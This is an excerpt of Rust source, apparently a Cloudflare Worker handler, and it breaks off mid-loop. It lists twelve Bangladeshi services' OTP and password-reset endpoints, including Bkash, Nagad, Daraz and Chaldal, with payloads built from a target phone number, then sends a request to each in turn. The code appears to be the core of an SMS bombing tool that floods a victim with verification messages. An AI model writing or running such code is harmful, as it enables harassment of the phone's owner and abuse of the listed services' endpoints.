...
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    ...
    let apis: Vec<(&str, &str, Value)> = vec![
        ("Shadhin Music", "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
         json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})),
        ("Khaodao", "https://api.eat-z.com/auth/customer/app-connect",
         json!({"username": &plus_bd})),
        ("Walton Plaza", "https://waltonplaza.com.bd/api/auth/otp/create",
         json!({"auth": {"countryCode": "880", "phone": &bd_no}, "captchaToken": "recapcha"})),
        ("Easy.com.bd", "https://core.easy.com.bd/api/v1/forgot-password-otp",
         json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": &number})),
        ("Chaldal", "https://chaldal.com/api/OTP/GenerateOTP",
         json!({"phoneNumber": &plus_bd})),
        ("Shajgoj", "https://shajgoj.com/wp-json/cocart/v1/customer/otp",
         json!({"phone": &number, "type": "login"})),
        ("Bkash", "https://www.bkash.com/api/get-otp",
         json!({"mobile": &number})),
        ("Nagad", "https://api.mynagad.com/api/dfs/check-account",
         json!({"accountNumber": &bd_full})),
        ("Pathao Food", "https://pathao.com/api/v1/auth/otp",
         json!({"phone": &number, "country_code": "+880"})),
        ("Shohoz", "https://shohoz.com/api/v4.0/user/sendOTP",
         json!({"mobile_no": &number})),
        ("Daraz", "https://member.daraz.com.bd/user/api/v1/otp/sendOtp",
         json!({"mobile": &bd_full, "countryCode": "880", "action": "REGISTER"})),
        ("Sheba.xyz", "https://sheba.xyz/api/v2/auth/otp",
         json!({"mobile": &number})),
    ];
    ...
    for (name, url, payload) in apis {
        ...
        let result = match Request::new_with_init(url, &fetch_init) {
            Ok(api_req) => match Fetch::Request(api_req).send().await {
                Ok(mut r) => {
